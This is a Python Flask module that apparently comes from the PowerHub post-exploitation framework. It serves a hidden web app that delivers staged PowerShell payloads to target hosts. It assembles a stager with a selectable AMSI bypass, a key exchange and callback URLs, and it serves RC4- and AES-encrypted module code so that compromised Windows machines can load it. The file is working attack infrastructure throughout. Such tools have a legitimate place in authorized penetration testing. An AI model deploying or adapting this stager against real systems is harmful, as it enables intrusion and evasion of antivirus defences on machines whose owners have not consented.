from base64 import b64encode
import binascii
import logging
import os

from flask import render_template, request, Response, Flask

from powerhub.tools import encrypt_rc4, encrypt_aes, compress
import powerhub.modules as phmod
from powerhub.stager import webdav_url, callback_urls, get_stage
from powerhub.directories import XDG_DATA_HOME, BASE_DIR
from powerhub.dhkex import DH_G, DH_MODULUS, DH_ENDPOINT
from powerhub.env import powerhub_app as ph_app
from powerhub import __version__

hidden_app = Flask(
    'hidden_app',
    template_folder=os.path.join(BASE_DIR, 'templates'),
)
hidden_app.templates_auto_reload = True

log = logging.getLogger(__name__)


@hidden_app.add_template_filter
def debug(msg):
    """This is a function for debugging statements in jinja2 templates"""
    if ph_app.args.DEBUG:
        return msg
    return ""


@hidden_app.add_template_filter
def rc4encrypt(msg):
    """This is a function for encrypting strings in jinja2 templates"""
    return b64encode(encrypt_rc4(msg.encode(), ph_app.key)).decode()


@hidden_app.add_template_filter
def rc4byteencrypt(data):
    """This is a function for encrypting bytes in jinja2 templates

    data must be hexascii encoded.
    """
    encrypted = encrypt_rc4(b64encode(binascii.unhexlify(data)), ph_app.key)
    return b64encode(encrypted).decode()


def get_stage3(args):
    minimal = (args.get('m') is not None)
    transport = args.get('t', 'http')

    powerhub_context = dict(
        modules=phmod.modules,
        callback_url=callback_urls()[transport],
        transport=transport,
        webdav_url=webdav_url(),
        key=ph_app.key,
        VERSION=__version__,
        minimal=minimal,
    )

    stage3 = render_template(
        "powershell/powerhub.ps1",
        **powerhub_context,
    )

    return stage3


def get_profile():
    try:
        with open(os.path.join(XDG_DATA_HOME, "profile.ps1"), "r") as f:
            profile = f.read()
    except Exception as e:
        log.error("Error while reading profile.ps1: %s" % str(e))
        profile = ""

    return profile


def get_clipboard_entry(args):
    try:
        clipboard_id = int(args.get('c'))
        clipboard_entry = ph_app.clipboard.entries[clipboard_id]
        if clipboard_entry.executable:
            clipboard_entry = clipboard_entry.content
        else:
            log.error(
                "Cannot include clipboard entry %d, "
                "because the executable flag is not set"
            )
            clipboard_entry = ""
    except (TypeError, IndexError):
        clipboard_entry = ""

    return clipboard_entry


@hidden_app.route('/')
def stager():
    """Load the stager"""
    stage3 = get_stage3(request.args)
    profile = get_profile()
    clipboard_entry = get_clipboard_entry(request.args)

    amsi_bypass = request.args.get('a', 'reflection')
    amsi_bypass = os.path.join('powershell', 'amsi', amsi_bypass + '.ps1')

    kex = request.args.get('k', 'dh')
    natural = (request.args.get('n') is not None)
    transport = request.args.get('t', 'http')

    key = ph_app.key

    stager_context = dict(
        key=key,
        amsibypass=amsi_bypass,
        callback=callback_urls()[transport],
        kex=kex,
        DH_G=DH_G,
        DH_MODULUS=DH_MODULUS,
        dh_endpoint=DH_ENDPOINT,
    )

    result = get_stage(
        key,
        stage3_strings=[stage3, profile, clipboard_entry],
        context=stager_context,
        debug=ph_app.args.DEBUG,
        natural=natural,
    )

    return Response(result, content_type='text/plain; charset=utf-8')


@hidden_app.route('/list')
def hub_modules():
    """Return list of hub modules"""

    context = {
        "modules": phmod.modules,
    }

    result = render_template(
        "powershell/modules.ps1",
        **context,
    ).encode()

    result = b64encode(encrypt_aes((result), ph_app.key))
    return Response(result, content_type='text/plain; charset=utf-8')


@hidden_app.route('/module')
def load_module():
    """Load a single module"""

    if 'm' not in request.args:
        return Response('error')

    n = int(request.args.get('m'))

    if n < len(phmod.modules):
        phmod.modules[n].activate()
        code = phmod.modules[n].code

        if 'c' in request.args:
            encrypted = encrypt_aes(compress(code), ph_app.key)
            resp = b64encode(encrypted),
        else:
            resp = b64encode(encrypt_aes(code, ph_app.key)),

        return Response(
            resp,
            content_type='text/plain; charset=utf-8'
        )
    else:
        return Response("not found")
